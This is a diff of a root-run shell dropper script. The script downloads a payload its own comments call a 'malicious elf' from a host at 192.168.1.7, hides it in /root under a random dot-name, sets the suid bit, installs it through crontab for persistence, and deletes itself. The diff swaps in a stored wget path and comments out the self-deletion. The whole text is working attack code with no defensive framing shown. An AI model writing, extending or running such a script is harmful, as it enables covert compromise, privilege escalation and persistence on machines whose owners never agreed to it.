@@ -14,6 +14,9 @@ if [ "$EUID" -ne 0 ]
   exit
 fi
 
+# Save wget location
+WGET=$(which wget)
+
 # Url with payload to download
 URL="https://192.168.1.7:8080/payload.elf"
 
@@ -24,7 +27,7 @@ PAYLOAD=$RANDOM
 PAYLOAD=".${PAYLOAD}"
 
 # Download malicious elf
-wget -q --no-check-certificate "${URL}" -O /root/$PAYLOAD
+$WGET -q --no-check-certificate "${URL}" -O /root/$PAYLOAD
 
 # Make suid executable :)
 chmod u+s /root/$PAYLOAD
@@ -37,4 +40,4 @@ crontab temp_cron
 rm temp_cron
 
 # Remove itself
-rm -- "$0"
+#rm -- "$0"
